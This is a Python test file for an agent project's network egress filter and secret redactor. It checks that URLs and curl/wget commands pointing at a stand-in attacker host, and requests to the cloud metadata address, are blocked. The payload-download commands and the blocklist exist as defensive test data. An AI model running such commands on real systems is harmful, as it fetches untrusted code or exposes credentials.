from __future__ import annotations

from src.skills.egress import check_command, check_url
from src.skills.redaction import Redactor
from src.utils.fsar_config import FsarConfig


def _config(tmp_path) -> FsarConfig:
    path = tmp_path / "fsar.yaml"
    path.write_text(
        "security:\n"
        "  egress:\n"
        "    enabled: true\n"
        "    mode: deny\n"
        "    allowlist: ['api.openai.com:443', '127.0.0.0/8']\n"
        "    blocklist: ['*.example.com', '169.254.0.0/16']\n"
        "  redaction:\n"
        "    enabled: true\n"
        "    max_string_length: 128\n"
        "    patterns: []\n",
        encoding="utf-8",
    )
    return FsarConfig(path)


def test_egress_blocklist_precedes_allowlist(tmp_path):
    config = _config(tmp_path)

    assert check_url("https://api.openai.com/v1", config).allowed
    assert not check_url("https://attacker.example.com/x", config).allowed
    assert not check_url("http://169.254.0.1/metadata", config).allowed


def test_command_urls_are_checked(tmp_path):
    decision = check_command(
        "curl https://attacker.example.com/payload", _config(tmp_path)
    )

    assert not decision.allowed
    assert not check_command("wget attacker.example.com/payload", _config(tmp_path)).allowed


def test_redactor_masks_keys_recursively_and_truncates(tmp_path):
    redactor = Redactor(_config(tmp_path))
    key = "sk-proj-" + "A" * 30

    result = redactor.redact({"text": f"login {key}", "long": "not-secret " * 20})

    assert result["text"] == "login [REDACTED:api_key_pattern]"
    assert len(result["long"]) == 128
